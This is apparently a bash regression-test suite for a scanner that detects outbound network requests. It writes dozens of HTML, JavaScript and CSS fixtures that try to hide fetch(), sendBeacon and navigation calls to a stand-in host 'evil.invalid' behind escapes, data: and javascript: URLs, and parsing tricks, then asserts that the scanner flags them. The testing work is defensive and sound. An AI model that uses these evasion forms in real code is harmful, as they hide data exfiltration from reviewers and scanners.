printf "const sample='<img src=\"%sevil.invalid/unknown\">';\n" "$_pr" > "$T/r8polyunknown/artifact"

# data:/blob: targets themselves are local controls even when their payload/origin text contains an
# absolute spelling. A literal executable data:text/html document is a nested parsing context and
# must still expose a request in its decoded markup; a local nested path remains clean.
mkdir -p "$T/r8localopaque" "$T/r8datahtml" "$T/r8datahtmllocal" \
         "$T/r8dataworker" "$T/r8datasharedworker" "$T/r8dataimport" \
         "$T/r8dataimportscripts" "$T/r8dataworkerbase64" "$T/r8datalink" \
         "$T/r8datawindowopen" "$T/r8datalocation" "$T/r8dataframesrc" \
         "$T/r8datastaticimport" "$T/r8cssblob" "$T/r8cssdata" "$T/r8dynamicblob" \
         "$T/r8localhttpspath" "$T/r8localhttpsdot" "$T/r8datascriptsrc" \
         "$T/r8datasettersrc" "$T/r8datacssimport" "$T/r8localstunpath" "$T/r8localturnpath"
printf 'fetch("data:text/plain,%s"); new Worker("blob:%s/id");\n' \
  "$(url_https docs.invalid/not-a-request)" "$(url_https origin.invalid)" > "$T/r8localopaque/a.js"
printf '<iframe src="data:text/html,&lt;img src=&quot;%sevil.invalid/data-doc&quot;&gt;"></iframe>\n' \
  "$_pr" > "$T/r8datahtml/i.html"
printf '<iframe src="data:text/html,&lt;img src=&quot;/local.png&quot;&gt;"></iframe>\n' \
  > "$T/r8datahtmllocal/i.html"
printf 'new Worker("data:text/javascript,fetch(\047%sevil.invalid/worker\047)")\n' \
  "$_pr" > "$T/r8dataworker/a.js"
printf 'new SharedWorker("data:text/javascript,fetch(\047%sevil.invalid/shared\047)")\n' \
  "$_pr" > "$T/r8datasharedworker/a.js"
printf 'import("data:text/javascript,fetch(\047%sevil.invalid/module\047)")\n' \
  "$_pr" > "$T/r8dataimport/a.js"
printf 'importScripts("data:text/javascript,fetch(\047%sevil.invalid/import-scripts\047)")\n' \
  "$_pr" > "$T/r8dataimportscripts/a.js"
printf 'new Worker("data:text/javascript;base64,ZmV0Y2goIi8vZXZpbC5pbnZhbGlkIik=")\n' \
  > "$T/r8dataworkerbase64/a.js"
printf '<a href="data:text/html,&lt;img src=&quot;%sevil.invalid/link&quot;&gt;">x</a>\n' \
  "$_pr" > "$T/r8datalink/i.html"
printf 'window.open("data:text/html,<img src=\047%sevil.invalid/open\047>")\n' \
  "$_pr" > "$T/r8datawindowopen/a.js"
printf 'location.assign("data:text/html,<img src=\047%sevil.invalid/nav\047>")\n' \
  "$_pr" > "$T/r8datalocation/a.js"
printf 'frame.src="data:text/html,<script>fetch(\047%sevil.invalid/frame\047)</script>"\n' \
  "$_pr" > "$T/r8dataframesrc/a.js"
printf 'import "data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid/static-module%%22)"\n' \
  > "$T/r8datastaticimport/a.mjs"
printf 'a{background:url(blob:%s/id)}\n' "$(url_https origin.invalid)" > "$T/r8cssblob/a.css"
printf 'a{background:url(data:text/plain,%s)}\n' "$(url_https docs.invalid/text)" > "$T/r8cssdata/a.css"
# shellcheck disable=SC2016  # backticks/${id} are literal JavaScript template syntax
printf 'fetch(`blob:%s/${id}`)\n' "$(url_https origin.invalid)" > "$T/r8dynamicblob/a.js"
printf 'fetch("/assets/%s%s%s%slogo.svg")\n' "$_s" "$_t" "$_x" "$_sep" > "$T/r8localhttpspath/a.js"
printf 'fetch("./cache/%s%s%s%sartifact")\n' "$_s" "$_t" "$_x" "$_sep" > "$T/r8localhttpsdot/a.js"
printf 'script.src="data:text/javascript,fetch(\047%sevil.invalid/script-src\047)"\n' \
  "$_pr" > "$T/r8datascriptsrc/a.js"
printf 'script.setAttribute("src","data:text/javascript,fetch(\047%sevil.invalid/set-src\047)")\n' \
  "$_pr" > "$T/r8datasettersrc/a.js"
printf '@import "data:text/css,@import%%20url(%%22%%2F%%2Fevil.invalid%%2Fnested-css%%22)";\n' \
  > "$T/r8datacssimport/a.css"
printf 'fetch("/assets/stun:logo.svg")\n' > "$T/r8localstunpath/a.js"
printf '<img src="./cache/turn:artifact.png">\n' > "$T/r8localturnpath/i.html"

# URL preprocessing and JavaScript static-literal equivalence. Browsers remove ASCII tab/LF/CR
# from URL inputs, and JavaScript resolves static escape sequences before the fetching API sees the
# value. Bracket notation is the same API call and must not create a scanner-only bypass.
mkdir -p "$T/r8htmlrawtab" "$T/r8htmlentitytab" "$T/r8metatab" \
         "$T/r8jshexescape" "$T/r8jsunicodeescape" "$T/r8jslinecontinuation" \
         "$T/r8bracketglobalfetch" "$T/r8bracketbeacon" "$T/r8bracketlocassign" \
         "$T/r8datamodulepreload" "$T/r8datametarefresh" "$T/r8dataoversize" \
         "$T/r8strayquotecomment" "$T/r8strayquotescript" \
         "$T/r8scriptendstrayquote" "$T/r8styleendstrayquote" \
         "$T/r8selfbracketfetch" "$T/r8bracketlocdotassign" \
         "$T/r8escapedfetchident" "$T/r8escapedbeaconident" \
         "$T/r8escapedfirstfetch" "$T/r8escapedglobalfetch" \
         "$T/r8escapedfirstbeacon" "$T/r8escapedfirstlocation" \
         "$T/r8escapedwindowlocation" "$T/r8globalthislocation" \
         "$T/r8selflocation" "$T/r8topbracketlocation" "$T/r8parentlocation" \
         "$T/r8leadingnulurl" "$T/r8leadingsohurl" "$T/r8leadingbackspaceurl" \
         "$T/r8leadingsohnetwork" "$T/r8interiorentityscheme" \
         "$T/r8interiorentitynetwork" "$T/r8interiorentitymeta" "$T/r8leadingentitycontrol" \
         "$T/r8legacyxjavascript" "$T/r8legacyjavascript15" "$T/r8legacytextxjavascript" \
         "$T/r8datafragmentcontrol" "$T/r8dataquerycontrol" \
         "$T/r8modulefragmentcontrol" "$T/r8encodedurlmetadata" \
         "$T/r8regexexportanonclass" "$T/r8regexexportanonfunction" \
         "$T/r8regexexportanongenerator" "$T/r8regexexportanonasync" \
         "$T/r8javascriptanchor" "$T/r8javascriptiframe" "$T/r8javascriptmeta" \
         "$T/r8javascriptopen" "$T/r8javascriptlocationassign" \
         "$T/r8javascriptlocationreplace" "$T/r8javascriptdirectlocation" \
         "$T/r8javascripthrefprop" "$T/r8javascriptsrcprop" \
         "$T/r8javascriptsethref" "$T/r8javascriptsetsrc" \
         "$T/r8javascriptstringcontrol" "$T/r8javascriptdatacontrol" \
         "$T/r8javascriptsettitlecontrol" "$T/r8optionallocationassign" \
         "$T/r8optionallocationbracket" "$T/r8optionalwindowassign" \
         "$T/r8optionalwindowbracket" "$T/r8optionalglobalbracket" \
         "$T/r8optionalpropertycontrol" "$T/r8optionalkeycontrol"
printf '<img src="h\tt%s%s%stab.invalid/raw">\n' "$_t" "$_x" "$J" \
  > "$T/r8htmlrawtab/i.html"
printf '<img src="h&#x09;t%s%s%stab.invalid/entity">\n' "$_t" "$_x" "$J" \
  > "$T/r8htmlentitytab/i.html"
printf '<meta http-equiv="refresh" content="0;url=h\tt%s%s%smeta.invalid/tab">\n' \
  "$_t" "$_x" "$J" > "$T/r8metatab/i.html"
printf 'fetch("\\x68t%s%s%sescape.invalid/hex")\n' "$_t" "$_x" "$J" \
  > "$T/r8jshexescape/a.js"
printf 'fetch("\\u0068t%s%s%sescape.invalid/unicode")\n' "$_t" "$_x" "$J" \
  > "$T/r8jsunicodeescape/a.js"
printf 'fetch("ht\\\n%s%s%sescape.invalid/continuation")\n' "$_t" "$_x" "$J" \
  > "$T/r8jslinecontinuation/a.js"
printf 'globalThis["fetch"]("%sfetch.invalid/bracket")\n' "$_pr" \
  > "$T/r8bracketglobalfetch/a.js"
printf 'navigator["sendBeacon"]("%sbeacon.invalid/bracket")\n' "$_pr" \
  > "$T/r8bracketbeacon/a.js"
printf 'document["location"]["assign"]("%snav.invalid/bracket")\n' "$_pr" \
  > "$T/r8bracketlocassign/a.js"
printf '<link rel="modulepreload" href="data:text/javascript,import(%%22%%2F%%2Fevil.invalid%%2Fdep%%22)">\n' \
  > "$T/r8datamodulepreload/i.html"
printf '<meta http-equiv="refresh" content="0;url=data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fmeta%%22)%%3C%%2Fscript%%3E">\n' \
  > "$T/r8datametarefresh/i.html"
printf '<iframe src="data:text/html,' > "$T/r8dataoversize/i.html"
head -c 1048577 /dev/zero | LC_ALL=C tr '\0' 'A' >> "$T/r8dataoversize/i.html"
printf '"></iframe>\n' >> "$T/r8dataoversize/i.html"
printf '<div " <!--audit>label</div><img src="%sevil.invalid/stray-comment">\n' "$_pr" \
  > "$T/r8strayquotecomment/i.html"
printf '<div " <script>>label</div><img src="%sevil.invalid/stray-script">\n' "$_pr" \
  > "$T/r8strayquotescript/i.html"
printf '<script>const local=1;</script " ><img src=%sevil.invalid/script-end>\n' "$_pr" \
  > "$T/r8scriptendstrayquote/i.html"
printf '<style>body{color:red}</style '\'' ><img src=%sevil.invalid/style-end>\n' "$_pr" \
  > "$T/r8styleendstrayquote/i.html"
printf 'self["fetch"]("%sevil.invalid/self")\n' "$_pr" \
  > "$T/r8selfbracketfetch/a.js"
printf 'window["location"].assign("%sevil.invalid/dot-assign")\n' "$_pr" \
  > "$T/r8bracketlocdotassign/a.js"
printf 'f\\u0065tch("%sevil.invalid/escaped-fetch")\n' "$_pr" \
  > "$T/r8escapedfetchident/a.js"
printf 'navigator.send\\u0042eacon("%sevil.invalid/escaped-beacon")\n' "$_pr" \
  > "$T/r8escapedbeaconident/a.js"
printf '\\u0066etch("%sevil.invalid/escaped-first-fetch")\n' "$_pr" \
  > "$T/r8escapedfirstfetch/a.js"
printf 'globalThis.\\u0066etch("%sevil.invalid/escaped-global-fetch")\n' "$_pr" \
  > "$T/r8escapedglobalfetch/a.js"
printf 'navigator.\\u0073endBeacon("%sevil.invalid/escaped-first-beacon")\n' "$_pr" \
  > "$T/r8escapedfirstbeacon/a.js"
printf '\\u006cocation.assign("%sevil.invalid/escaped-first-location")\n' "$_pr" \
  > "$T/r8escapedfirstlocation/a.js"
printf 'window.\\u006cocation.assign("%sevil.invalid/escaped-window-location")\n' "$_pr" \
  > "$T/r8escapedwindowlocation/a.js"
printf 'globalThis.location = "%sevil.invalid/global-location"\n' "$_pr" \
  > "$T/r8globalthislocation/a.js"
printf 'self.location = "%sevil.invalid/self-location"\n' "$_pr" \
  > "$T/r8selflocation/a.js"
printf 'top["location"] = "%sevil.invalid/top-location"\n' "$_pr" \
  > "$T/r8topbracketlocation/a.js"
printf 'parent.location = "%sevil.invalid/parent-location"\n' "$_pr" \
  > "$T/r8parentlocation/a.js"
printf 'fetch("\\x00%s%s%s%scontrol.invalid/nul")\n' "$_s" "$_t" "$_x" "$J" \
  > "$T/r8leadingnulurl/a.js"
printf 'fetch("\\x01%s%s%s%scontrol.invalid/soh")\n' "$_s" "$_t" "$_x" "$J" \
  > "$T/r8leadingsohurl/a.js"
printf 'fetch("\\b%s%s%s%scontrol.invalid/backspace")\n' "$_s" "$_t" "$_x" "$J" \
  > "$T/r8leadingbackspaceurl/a.js"
printf 'fetch("\\x01%scontrol.invalid/network")\n' "$_pr" \
  > "$T/r8leadingsohnetwork/a.js"
printf '<img src="ht&#1;%s%s%sdocs.invalid/interior-scheme">\n' "$_t" "$_x" "$J" \
  > "$T/r8interiorentityscheme/i.html"
printf '<img src="%s&#1;%sdocs.invalid/interior-network">\n' "$_sl" "$_sl" \
  > "$T/r8interiorentitynetwork/i.html"
printf '<meta http-equiv="refresh" content="0;url=ht&#1;%s%s%sdocs.invalid/interior-meta">\n' \
  "$_t" "$_x" "$J" > "$T/r8interiorentitymeta/i.html"
printf '<img src="&#1;%s%s%s%scontrol.invalid/leading-entity">\n' "$_s" "$_t" "$_x" "$J" \
  > "$T/r8leadingentitycontrol/i.html"
printf '<script src="data:application/x-javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Flegacy-script%%22)"></script>\n' \
  > "$T/r8legacyxjavascript/i.html"
printf 'import("data:text/javascript1.5,fetch(%%22%%2F%%2Fevil.invalid%%2Flegacy-import%%22)")\n' \
  > "$T/r8legacyjavascript15/a.js"
printf '<link rel="modulepreload" href="data:text/x-javascript,import(%%22%%2F%%2Fevil.invalid%%2Flegacy-module%%22)">\n' \
  > "$T/r8legacytextxjavascript/i.html"
printf '<script src="data:text/javascript,void%%200#fetch(%%22%%2F%%2Fdocs.invalid%%2Ffragment%%22)"></script>\n' \
  > "$T/r8datafragmentcontrol/i.html"
printf 'import("data:text/javascript,0?0:fetch(%%22%%2F%%2Fevil.invalid%%2Fquery-exec%%22)")\n' \
  > "$T/r8dataquerycontrol/a.js"
printf '<link rel="modulepreload" href="data:text/javascript,void%%200#import(%%22%%2F%%2Fdocs.invalid%%2Ffragment%%22)">\n' \
  > "$T/r8modulefragmentcontrol/i.html"
printf 'import("data:text/javascript,fetch(%%22%%2F%%2Fevil.invalid%%2Fencoded%%23hash%%3Fquery%%22)")\n' \
  > "$T/r8encodedurlmetadata/a.js"
printf 'export default class {}\n/[a//]/.test(x); fetch("%sevil.invalid/anon-class")\n' "$_pr" \
  > "$T/r8regexexportanonclass/a.mjs"
printf 'export default function () {}\n/[a//]/.test(x); fetch("%sevil.invalid/anon-function")\n' "$_pr" \
  > "$T/r8regexexportanonfunction/a.mjs"
printf 'export default function* () {}\n/[a//]/.test(x); fetch("%sevil.invalid/anon-generator")\n' "$_pr" \
  > "$T/r8regexexportanongenerator/a.mjs"
printf 'export default async function () {}\n/[a//]/.test(x); fetch("%sevil.invalid/anon-async")\n' "$_pr" \
  > "$T/r8regexexportanonasync/a.mjs"
printf '<a href="javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fanchor%%22)">x</a>\n' \
  > "$T/r8javascriptanchor/i.html"
printf '<iframe src="javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fiframe%%22)"></iframe>\n' \
  > "$T/r8javascriptiframe/i.html"
printf '<meta http-equiv="refresh" content="0;url=javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fmeta%%22)">\n' \
  > "$T/r8javascriptmeta/i.html"
printf 'window.open("javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fopen%%22)")\n' \
  > "$T/r8javascriptopen/a.js"
printf 'location.assign("javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fassign%%22)")\n' \
  > "$T/r8javascriptlocationassign/a.js"
printf 'location.replace("javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Freplace%%22)")\n' \
  > "$T/r8javascriptlocationreplace/a.js"
printf 'location = "javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fdirect%%22)"\n' \
  > "$T/r8javascriptdirectlocation/a.js"
printf 'anchor.href = "javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fhref%%22)"\n' \
  > "$T/r8javascripthrefprop/a.js"
printf 'frame.src = "javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fsrc%%22)"\n' \
  > "$T/r8javascriptsrcprop/a.js"
printf 'anchor.setAttribute("href","javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fset-href%%22)")\n' \
  > "$T/r8javascriptsethref/a.js"
printf 'frame.setAttribute("src","javascript:fetch(%%22%%2F%%2Fevil.invalid%%2Fset-src%%22)")\n' \
  > "$T/r8javascriptsetsrc/a.js"
printf 'const note = "javascript:fetch(%%22%%2F%%2Fdocs.invalid%%2Fstring%%22)"\n' \
  > "$T/r8javascriptstringcontrol/a.js"
printf '<div data-note="javascript:fetch(%%22%%2F%%2Fdocs.invalid%%2Fdata-note%%22)">x</div>\n' \
  > "$T/r8javascriptdatacontrol/i.html"
printf 'node.setAttribute("title","javascript:fetch(%%22%%2F%%2Fdocs.invalid%%2Ftitle%%22)")\n' \
  > "$T/r8javascriptsettitlecontrol/a.js"
printf 'location?.assign("%sevil.invalid/optional-assign")\n' "$_pr" \
  > "$T/r8optionallocationassign/a.js"
printf 'location?.["replace"]("%sevil.invalid/optional-bracket")\n' "$_pr" \
  > "$T/r8optionallocationbracket/a.js"
printf 'window.location?.assign("%sevil.invalid/window-optional")\n' "$_pr" \
  > "$T/r8optionalwindowassign/a.js"
printf 'window.location?.["replace"]("%sevil.invalid/window-bracket")\n' "$_pr" \
  > "$T/r8optionalwindowbracket/a.js"
printf 'window["location"]?.["replace"]("%sevil.invalid/global-bracket")\n' "$_pr" \
  > "$T/r8optionalglobalbracket/a.js"
printf 'location?.assign; const note="%sdocs.invalid/not-called"\n' "$_pr" \
  > "$T/r8optionalpropertycontrol/a.js"
printf 'const table={"replace":"%sdocs.invalid/key-only"}\n' "$_pr" \
  > "$T/r8optionalkeycontrol/a.js"

check() { # <label> <want-exit> <needle-or-empty> -- <scan args...>
  local label="$1" want="$2" needle="$3"; shift 3
  local out got
  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ -n "$needle" ] && ! printf '%s' "$out" | grep -q -- "$needle"; then no "$label (missing '$needle')"; return; fi
  ok "$label"
}

check_count() { # <label> <want-exit> <want-EGRESS-line-count> -- <scan args...>
  # asserts the EXACT number of EGRESS records, so on a multi-candidate line one detected hit can
  # never mask a missed sibling (R6 finding #4).
  local label="$1" want="$2" wantc="$3"; shift 3
  local out got cnt
  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
  cnt="$(printf '%s\n' "$out" | grep -c '^EGRESS ')"
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ "$cnt" != "$wantc" ]; then no "$label (EGRESS count want=$wantc got=$cnt)"; return; fi
  ok "$label"
}

echo "== scan-egress regressions =="
check "clean tree passes"                       0 ""                  "$T/clean"
check "non-fetching xmlns is not egress"        0 "NSURI"             "$T/clean"
check "waived text passes"                      0 "WAIVED"            "$T/waived"
check "extensionless script detected"           1 "deploy"            "$T/dirty"
check "UPPERCASE .SH detected"                  1 "RUN.SH"            "$T/dirty"
check "symlink flagged"                         1 "SYMLINK"           "$T/dirty"
check "binary fails closed in isolation"        1 "UNSCANNED(binary)" "$T/binonly"
check "binary-only no set -u crash"             1 "only.bin"          "$T/binonly"
check "symlink-only no set -u crash"            1 "SYMLINK"           "$T/symonly"
check "binary embedded URL is scanned + fails"  1 "EGRESS(binary)"    "$T/binembed"
check "newline-in-filename still enumerated"    1 "EGRESS"            "$T/nlname"
check "binary waived by --allow-binary passes"  0 "WAIVED-BINARY"     --allow-binary '*only.bin' "$T/binonly"
check "unmatched --allow-binary still fails"    1 "UNSCANNED(binary)" --allow-binary '*.png' "$T/binonly"

echo "== 2.0.3 self-red-team (adversarial panel) =="
check "protocol-relative srcset fails (isolated)" 1 "cdn.evil.invalid"  "$T/pr_srcset"
check "protocol-relative poster fails (isolated)" 1 "poster.evil.invalid" "$T/pr_poster"
check "meta-refresh protocol-relative fails"     1 "meta.evil.invalid" "$T/pr_meta"
check "DOCTYPE wrapper does not launder a URL"   1 "EGRESS"            "$T/laundry"
check "WebRTC stun: scheme detected"             1 "EGRESS"            "$T/webrtc"
check "same-origin/data fetch + README pass"     0 ""                 "$T/localok"
check "FIFO in dir fails closed (no hang)"        1 "SPECIAL"           "$T/fifo"
check "direct FIFO target fails closed"          1 "SPECIAL"           "$T/fifo/pipe"
check "embedded-URL binary fails even if waived" 1 "EGRESS(binary)"    --allow-binary '*' "$T/binurl"

echo "== 2.0.3-r4 (Codex round-3 exact-head) =="
check "xmlns cannot launder a real fetch()"      1 "EGRESS"            "$T/nsfetch"
check "xmlns variable is real egress"            1 "EGRESS"            "$T/nsvar"
check "genuine in-tag xmlns still benign"        0 "NSURI"             "$T/nssvg"
check "NUL-free P6 rawbits classified binary"    1 "UNSCANNED(binary)" "$T/ppm"
check "object data protocol-relative fails"      1 "EGRESS"            "$T/objdata"
check "navigator.sendBeacon fails"               1 "EGRESS"            "$T/beacon"
check "XHR.open URL argument fails"              1 "EGRESS"            "$T/xhropen"
check_count "both srcset candidates flagged (count==2)" 1 2            "$T/srcset2"
check "srcset candidate A isolated fails"        1 "sa.invalid/1.png"  "$T/srcset_a"
check "srcset candidate B isolated fails"        1 "sb.invalid/2.png"  "$T/srcset_b"
check "leading whitespace in quoted attr fails"  1 "EGRESS"            "$T/leadws"
check "multiline attribute fails"                1 "EGRESS"            "$T/mlattr"
check "multiline fetch literal fails"            1 "EGRESS"            "$T/mlfetch"
echo "== 2.0.3-r5 (Codex round-4 exact-head) =="
check "late NUL cannot collapse the counts channel" 1 "EGRESS"       "$T/latenul"
check "protocol-relative IPv6 literal host fails"   1 "EGRESS"       "$T/ipv6"
check "static import from external fails"           1 "EGRESS"       "$T/esmod"
check "export-from external fails"                  1 "EGRESS"       "$T/expfrom"
check "backtick-template fetch fails"               1 "EGRESS"       "$T/btfetch"
check "new Worker external script fails"            1 "EGRESS"       "$T/worker"
check "serviceWorker.register fails"                1 "EGRESS"       "$T/swreg"
check "location.assign navigation fails"            1 "EGRESS"       "$T/locnav"
check "backslash-normalized https URL fails"        1 "EGRESS"       "$T/bslash"
check "dot-prefixed .src property still fails"      1 "EGRESS"       "$T/jsprop"
check "plain JS src variable is not egress"         0 ""             "$T/fpsrc"
check "plain JS data variable is not egress"        0 ""             "$T/fpdata"
check "div data attribute is not egress"            0 ""             "$T/fpdiv"
check "second xmlns in one tag is still benign"     0 "NSURI"        "$T/ns2"
# unreadable file / traversal error can only be simulated as non-root
if [ "$(id -u)" -ne 0 ]; then
  chmod 000 "$T/unreadbin/font.woff2"
  check "unreadable URL-binary fails despite waiver" 1 "UNREADABLE" --allow-binary '*.woff2' "$T/unreadbin"
  chmod 644 "$T/unreadbin/font.woff2"
  chmod 000 "$T/travtree/sub/secret"
  check "traversal error fails the tree closed"      1 "TRAVERSAL"  "$T/travtree"
  chmod 755 "$T/travtree/sub/secret"
else
  printf '  skip  unreadable-file + traversal (running as root — cannot simulate unreadable)\n'
fi

echo "== 2.0.3-r6 (Codex round-5 exact-head) =="
# S2: compact ES module forms are caught; a string constant with no `from` stays clean
check "compact import{a}from is caught"          1 "EGRESS"       "$T/r6imp"
check "compact export{a}from is caught"          1 "EGRESS"       "$T/r6exp"
check "compact import*as ... from is caught"     1 "EGRESS"       "$T/r6star"
check "bare side-effect import is caught"        1 "EGRESS"       "$T/r6bare"
check "export const string is NOT egress"        0 ""             "$T/r6konst"
# S3: an ESC-bearing filename must appear neutralized (no raw ESC byte) in the diagnostic
r6esc_out="$(bash "$SCAN" "$T/r6esc" 2>&1)"
if printf '%s' "$r6esc_out" | LC_ALL=C grep -q "$(printf '\033')"; then
  no "S3 control byte in path is sanitized (raw ESC leaked)"
else
  ok "S3 control byte in path is sanitized (raw ESC leaked)"
fi
# S3 also: the sanitized diagnostic still visibly reports the symlink with '?' placeholders
if printf '%s' "$r6esc_out" | grep -q 'SYMLINK .*FORGED-PASS'; then
  ok "S3 sanitized SYMLINK still shown"
else
  no "S3 sanitized SYMLINK still shown"
fi

echo "== 2.0.3-r7 (scanner attack-matrix) =="
check "WHATWG triple-slash authority is caught"       1 "EGRESS" "$T/r7triple"
check "WHATWG percent-decoded host is caught"         1 "EGRESS" "$T/r7pcthost"
check "WHATWG empty-userinfo authority is caught"     1 "EGRESS" "$T/r7userinfo0"
check "WHATWG password-userinfo authority is caught"  1 "EGRESS" "$T/r7userinfo1"
check "WHATWG slash-slash-backslash is caught"        1 "EGRESS" "$T/r7mix3"
check "WHATWG slash-backslash authority is caught"    1 "EGRESS" "$T/r7mix2"
check "percent-encoded slash host is invalid, not egress" 0 ""    "$T/r7badpct"
check_count "leading-hyphen WHATWG host count==1"        1 1     "$T/r7hyphenhost"
check_count "leading-underscore WHATWG host count==1"    1 1     "$T/r7underhost"
check_count "percent-encoded userinfo cannot hide host"  1 1     "$T/r7pctuserinfo"

check "hex HTML entities in src are caught"           1 "EGRESS" "$T/r7enthex"
check "decimal HTML entities in src are caught"       1 "EGRESS" "$T/r7entdec"
check "named HTML entities in src are caught"         1 "EGRESS" "$T/r7entnamed"
check_count "entity-encoded absolute URL count==1"    1 1        "$T/r7entabs"
check_count "entity srcset candidates count==2"       1 2        "$T/r7entsrcset"
check "entity meta-refresh URL is caught"             1 "EGRESS" "$T/r7entmeta"
check "entity inline-CSS URL is caught"               1 "EGRESS" "$T/r7entcss"
check "entity in non-fetching title stays clean"      0 ""       "$T/r7enttitle"
check "double-encoded entity is decoded only once"    0 ""       "$T/r7entdouble"
check "entity in script is not HTML-decoded"          0 ""       "$T/r7entjs"
check "escaped markup stays ordinary text"            0 ""       "$T/r7escaped"
check "entity finding keeps source-line waiver"       0 "WAIVED" "$T/r7entwaive"

check "comment between fetch and call cannot hide it" 1 "EGRESS" "$T/r7fetchcomment"
check "commented bare import is still caught"         1 "EGRESS" "$T/r7importcomment"
check "comments around export/from are still caught"  1 "EGRESS" "$T/r7exportcomment"
check "comments around full import clause are caught" 1 "EGRESS" "$T/r7importclause"
check "bracket location href navigation is caught"    1 "EGRESS" "$T/r7locbracket"
check "window.open navigation is caught"              1 "EGRESS" "$T/r7windowopen"
check "setAttribute src is caught"                    1 "EGRESS" "$T/r7setsrc"
check "setAttributeNS href is caught"                 1 "EGRESS" "$T/r7sethrefns"
check_count "setAttribute srcset candidates count==2" 1 2        "$T/r7setsrcset"
check "setAttribute action is caught"                 1 "EGRESS" "$T/r7setaction"
check "setAttribute formaction is caught"             1 "EGRESS" "$T/r7setformaction"

check "JS line-commented call stays clean"            0 ""       "$T/r7linecomment"
check "JS block-commented module stays clean"         0 ""       "$T/r7blockcomment"
check "HTML-commented markup stays clean"             0 ""       "$T/r7htmlcomment"
check "code-shaped ordinary string stays clean"       0 ""       "$T/r7codestring"
check "comment marker inside real URL still blocks"   1 "EGRESS" "$T/r7urlcomment"
check "plain triple-slash JS variable stays clean"    0 ""       "$T/r7plaintriple"
check "new URL construction alone stays clean"        0 ""       "$T/r7newurl"
check "unrelated db.open stays clean"                 0 ""       "$T/r7dbopen"
check "hash/local/title controls stay clean"          0 ""       "$T/r7hashlocal"
check "real CSS url() still blocks"                   1 "EGRESS" "$T/r7cssurl"
check "CSS-commented url() stays clean"               0 ""       "$T/r7csscomment"
check "prose quote cannot mask live script body"      1 "EGRESS" "$T/r7prosescript"
check "markup-shaped JS string stays clean"           0 ""       "$T/r7markwstring"
check_count "optional fetch call count==1"            1 1        "$T/r7optional"
check_count "window bracket fetch count==1"           1 1        "$T/r7bracketfetch"
check "same-origin path containing double slash stays clean" 0 "" "$T/r7localdouble"
check "standalone JS markup string stays clean"       0 ""       "$T/r7jsmarkup"
check "HTML body code example stays clean"            0 ""       "$T/r7bodycode"
check_count "window.location assignment count==1"     1 1        "$T/r7winloc"
check_count "document.location assignment count==1"   1 1        "$T/r7docloc"
check_count "window bracket location count==1"        1 1        "$T/r7bracketloc"
check_count "decoded srcdoc nested fetch count==1"    1 1        "$T/r7srcdoc"
check_count "space-separated ping URLs count==2"      1 2        "$T/r7ping2"
check_count "CSS image-set candidates count==2"       1 2        "$T/r7image2"
check_count "chained bracket location href count==1"  1 1        "$T/r7brackethref"
check_count "apostrophe-leading WHATWG host count==1" 1 1        "$T/r7quotehost"
check_count "bang-leading WHATWG host count==1"       1 1        "$T/r7banghost"
check_count "unclosed script executes through EOF"    1 1        "$T/r7unclosedscript"
check_count "unclosed style parses through EOF"       1 1        "$T/r7unclosedstyle"
check_count "nested srcdoc unclosed script count==1"  1 1        "$T/r7srcdocunclosed"

echo "== 2.0.3-r8 (post-review parser boundaries) =="
check_count "abrupt HTML comment exposes active markup"       1 1 "$T/r8commentabrupt"
check_count "end-bang HTML comment exposes active markup"      1 1 "$T/r8commentbang"
check_count "decoded srcdoc abrupt comment exposes markup"     1 1 "$T/r8srcdocabrupt"
check_count "decoded srcdoc end-bang comment exposes markup"   1 1 "$T/r8srcdocbang"
check_count "script end tag with attributes closes raw text"   1 1 "$T/r8scriptattrs"
check_count "style end tag with slash closes raw text"         1 1 "$T/r8styleslash"
check_count "script comment text cannot hide following markup" 1 1 "$T/r8scriptcommentstring"
check_count "legacy script comment ends at newline"            1 1 "$T/r8scriptlegacycomment"
check_count "style comment text cannot hide following markup"  1 1 "$T/r8stylecommentstring"
check_count "legacy style comment cannot hide live CSS"        1 1 "$T/r8stylelegacycomment"
check_count "comment opener in attribute stays attribute text" 1 1 "$T/r8attrcommenttext"
check_count "script opener in attribute stays attribute text"  1 1 "$T/r8attrscripttext"
check_count "comment opener in unquoted attr stays text"        1 1 "$T/r8unquotedattrcomment"
check_count "script opener in unquoted attr stays text"         1 1 "$T/r8unquotedattrscript"
check_count "template substitution executes nested fetch"      1 1 "$T/r8templateexpr"
check_count "regex double slash cannot mask later fetch"       1 1 "$T/r8regexline"
check_count "regex slash-star cannot mask later fetch"         1 1 "$T/r8regexblock"
check_count "regex after control close cannot mask fetch"      1 1 "$T/r8regexafterif"
check_count "regex after block close cannot mask fetch"        1 1 "$T/r8regexafterblock"
check_count "regex after await cannot mask fetch"              1 1 "$T/r8regexawait"
check_count "regex after spread cannot mask fetch"             1 1 "$T/r8regexspread"
check_count "regex after export default cannot mask fetch"     1 1 "$T/r8regexdefault"
check_count "regex after extends cannot mask fetch"            1 1 "$T/r8regexextends"
check_count "default property division keeps later fetch live" 1 1 "$T/r8propdefaultdiv"
check_count "await property division keeps later fetch live"   1 1 "$T/r8propawaitdiv"
check_count "function-expression division keeps fetch live"    1 1 "$T/r8functiondiv"
check_count "post-increment division keeps later fetch live"   1 1 "$T/r8postincdiv"
check_count "post-decrement division keeps later fetch live"   1 1 "$T/r8postdecdiv"
check_count "regex used as division RHS cannot mask fetch"     1 1 "$T/r8regexdivisor"
check_count "nested function declaration permits regex goal"   1 1 "$T/r8nestedfunctionregex"
check_count "labeled block close permits regex goal"           1 1 "$T/r8labelregex"
check_count "regex after import declaration stays visible"     1 1 "$T/r8regeximportasi"
